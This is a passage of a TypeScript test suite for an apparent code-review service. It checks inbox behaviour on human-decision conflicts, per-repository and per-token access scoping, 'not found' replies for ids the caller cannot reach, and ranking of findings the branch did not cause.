    store.resolveConflict(repoId, a.id, b.id, "a person chose");

    const out = await callTool("review_inbox", {});
    expect(
      JSON.stringify(out),
      "the old text told a client to submit an empty diff, which the schema has always refused",
    ).not.toMatch(/empty diff/);
    expect(out["needs_human"]).toBe(0);
    const revRow = (out["reviews"] as { review_id: string; state: string }[]).find((r) => r.review_id === "revI");
    expect(revRow?.state, "must reflect the resume the inbox itself just triggered, not the stale needs_human row").toBe(
      "queued",
    );
    expect(store.getReview("revI", "alice")?.state, "the DB row itself must have moved, not just this reply").toBe(
      "queued",
    );
  });

  it("leaves a review needs_human when a real conflict is still open, and still names the question", async () => {
    store.createReview({
      id: "revI2", repoId, principal: "alice", branch: "feat/inbox2", intoRef: "main",
      ticket: "t", type: "code-arch", state: "needs_human", ladder: initialState(),
    });
    const a = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Holds must expire after seven days",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0022.md",
      sourceBlob: undefined, confidence: undefined,
    });
    const b = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Holds must never expire",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0030.md",
      sourceBlob: undefined, confidence: undefined,
    });
    store.recordConflict(repoId, a.id, b.id);

    const out = await callTool("review_inbox", {});
    expect(out["needs_human"]).toBe(1);
    const revRow = (out["reviews"] as { review_id: string; state: string }[]).find((r) => r.review_id === "revI2");
    expect(revRow?.state, "a genuinely open conflict must not be resumed").toBe("needs_human");
    expect(out["open_questions"]).toHaveLength(1);
  });
});

// TOKENS ARE PER-REPOSITORY; ACCESS CONTROL WAS PER-PRINCIPAL.
//
// A workgroup provisions each repository to the same human, so one person holding
// tokens for two repos is the NORMAL case — and both `review_inbox` and the review
// lookup asked only whether the principal matched. A client reported seeing lore's
// own branches through a rigid-monorepo token, which is exactly this.
//
// The old test named "binds each token to its own repo" asserted that the token ROWS
// carry different repo_ids. It passed the whole time, because it never checked that
// anything was scoped by them — a test that proved nothing about the property it named.
describe("a token reaches its own repository and no other", () => {
  let othersReview: string;

  beforeEach(() => {
    // Same principal, different repo — the shape that leaked.
    const other = store.db.prepare("SELECT repo_id FROM token WHERE principal = 'bob'").get() as { repo_id: string };
    othersReview = "rev_elsewhere";
    store.createReview({
      id: othersReview, repoId: other.repo_id, principal: "alice", branch: "someone-elses/branch",
      intoRef: "main", ticket: "t", type: "code-arch", state: "findings_ready", ladder: initialState(),
    });
  });

  it("does not list another repository's reviews in the inbox", async () => {
    store.recordFinding(othersReview, {
      fingerprint: "a".repeat(64), file: "secret.ts", line: 1, symbol: undefined, severity: "high",
      claim: "a claim from a repo this token cannot reach", evidence: "e", failureScenario: "f",
      cwe: undefined, origin: "t1", round: 1, firstSeen: new Date().toISOString(),
    });

    const out = await callTool("review_inbox", {});
    expect(JSON.stringify(out)).not.toContain("someone-elses/branch");
    expect(JSON.stringify(out)).not.toContain("a repo this token cannot reach");
  });

  // Failing as NOT FOUND rather than forbidden: "this exists but is not yours" tells
  // an unauthorized caller the id is real, and the id is the one thing worth guessing.
  it("refuses a valid id from another repository as though it did not exist", async () => {
    const res = await mcp(
      { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "review_poll", arguments: { review_id: othersReview } } },
      token,
    );
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:")) ?? "";
    const rpc = JSON.parse(line.slice("data:".length)) as { result?: { content?: { text?: string }[]; isError?: boolean } };

    expect(rpc.result?.isError).toBe(true);
    expect(rpc.result?.content?.[0]?.text).toContain("not found");
    expect(rpc.result?.content?.[0]?.text).not.toMatch(/forbidden|not yours|another/i);
  });
});

// The inbox is where a client looks FIRST, so "surface these to your user" arrived
// with nothing to surface. Being told to escalate something unnamed is worse than not
// being told: the only ways forward are to invent the question or to drop it, and
// inventing it is precisely what this service forbids everywhere else.
describe("the inbox carries the question too, not just review_poll", () => {
  it("names both statements when a review is parked at needs_human", async () => {
    store.createReview({
      id: "revI", repoId, principal: "alice", branch: "feat/z", intoRef: "main",
      ticket: "t", type: "code-arch", state: "needs_human", ladder: initialState(),
    });
    const a = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Money is stored as DECIMAL",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0009.md",
      sourceBlob: undefined, confidence: undefined,
    });
    const b = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Money must never be stored as DECIMAL",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0031.md",
      sourceBlob: undefined, confidence: undefined,
    });
    store.recordConflict(repoId, a.id, b.id);

    const out = await callTool("review_inbox", {});
    expect(out["needs_human"]).toBe(1);
    expect(JSON.stringify(out["open_questions"])).toContain("must never be stored as DECIMAL");
    expect(JSON.stringify(out["open_questions"])).toContain("docs/adr/0009.md");
    expect(String(out["note"])).toContain("IS the question");
  });
});

// A client triaging by severity did two `high` pattern matches in test fixtures it
// had never touched before three real `medium` spec contradictions in files it wrote.
// Both are true; only one set is this merge's to answer.
describe("findings the branch did not cause are marked and ranked below", () => {
  const record = (fp: string, file: string, severity: "high" | "medium", preexisting: boolean) =>
    store.recordFinding("revP", {
      fingerprint: fp.repeat(64).slice(0, 64), file, line: 1, symbol: undefined, severity,
      claim: `claim about ${file}`, evidence: "e", failureScenario: "f",
      cwe: undefined, origin: "t0", round: 1, firstSeen: new Date().toISOString(), preexisting,
    });

  beforeEach(() => {
    store.createReview({
      id: "revP", repoId, principal: "alice", branch: "feat/p", intoRef: "main",
      ticket: "t", type: "code-arch", state: "findings_ready", ladder: initialState(),
    });
  });

  it("puts the branch's own medium above an inherited high", async () => {
    record("a", "fixtures.test.ts", "high", true);
    record("b", "src/mine.ts", "medium", false);

    const out = await callTool("review_poll", { review_id: "revP" });
    const list = out["new_findings"] as { file: string; preexisting?: boolean }[];

    // Severity alone would invert this, and severity alone is what a client sorts on.
    expect(list[0]?.file).toBe("src/mine.ts");
    expect(list[1]?.preexisting).toBe(true);
  });

  it("says why the inherited one is not this branch's to answer", async () => {
    record("c", "fixtures.test.ts", "high", true);
    const out = await callTool("review_poll", { review_id: "revP" });
    const note = String((out["new_findings"] as { preexisting_note?: string }[])[0]?.preexisting_note);

    expect(note).toContain("NOT touched by your branch");
    expect(note).toContain("every other branch");
    // Reported, never dropped: it is real and someone should fix it.
    expect(note).toContain("worth a ticket");
  });

  it("marks nothing when the finding is in a file the branch changed", async () => {
    record("d", "src/mine.ts", "high", false);
    const out = await callTool("review_poll", { review_id: "revP" });
    expect((out["new_findings"] as Record<string, unknown>[])[0]).not.toHaveProperty("preexisting");
  });
});

// A POLL TAKES THE FINDINGS IT RETURNS, and that is what makes repository scope wrong
// once a repository has more than one holder (D-78).
//
// `review_poll` returns deltas and marks them delivered, so a colleague polling a review
// they did not start silently consumes its findings and the owner is shown nothing —
// not the findings, and not the fact that somebody took them. `rigid-monorepo` went from
// one token to three on 2026-08-07, which is what turned this from a note into a defect.
//
// Not a threat model. `principal` already records who a review belongs to and these are
// colleagues; it is an ACCIDENT model, because the obvious way to answer "how is that
// review doing" is to poll it.
describe("a review answers to the token that started it", () => {
  const started = (id: string, tokenHash: string | undefined) => {
    store.createReview({
      id, repoId, principal: "alice", branch: "feat/z", intoRef: "main",
      ticket: "t", type: "code-arch", state: "findings_ready", ladder: initialState(),
      ...(tokenHash === undefined ? {} : { tokenHash }),
    });
  };

  /** A second token on the SAME repository and the SAME principal — the workgroup case. */
  const sameRepoOtherToken = () => grantToken(store, repoId, "alice");

  const pollWith = async (reviewId: string, bearer: string) => {
    const res = await mcp(
      { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "review_poll", arguments: { review_id: reviewId } } },
      bearer,
    );
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:")) ?? "";
    return JSON.parse(line.slice("data:".length)) as { result?: { content?: { text?: string }[]; isError?: boolean } };
  };

  it("refuses a holder who did not start it, as NOT FOUND", async () => {
    started("revT", hashToken(token));
    const rpc = await pollWith("revT", sameRepoOtherToken());
    const text = String(rpc.result?.content?.[0]?.text ?? "");
    // NOT FOUND rather than forbidden, per D-23: "this exists but is not yours" confirms
    // the id is real, and an id is the one thing worth guessing.
    expect(text).toContain("not found");
    expect(text).not.toMatch(/forbidden|not yours/i);
  });

  it("lets the token that started it through", async () => {
    started("revU", hashToken(token));
    const out = await callTool("review_poll", { review_id: "revU" });
    expect(out["review_id"]).toBe("revU");
  });

  // Rows written before the column exists were started under repository scope, and that
  // is the only honest thing to give them: they were never bound to anything.
  it("leaves a review with no recorded token on repository scope", async () => {
    started("revV", undefined);
    const rpc = await pollWith("revV", sameRepoOtherToken());
    expect(String(rpc.result?.content?.[0]?.text ?? "")).toContain("revV");
  });

  // THE ROTATION ANSWER. Revoking a token would otherwise strand every review it
  // started — right for a compromised credential, wrong for the routine replacement
  // that is the common case. Stranding a colleague's in-flight work is a worse failure
  // than the accident this prevents, among people already trusted with the repository.
  it("falls back to repository scope once the binding token is revoked", async () => {
    const departing = grantToken(store, repoId, "alice");
    started("revW", hashToken(departing));

    const before = await pollWith("revW", token);
    expect(String(before.result?.content?.[0]?.text ?? "")).toContain("not found");

    revokeByPrefix(store, hashToken(departing).slice(0, 8));

    const after = await pollWith("revW", token);
    expect(String(after.result?.content?.[0]?.text ?? "")).toContain("revW");
  });
});
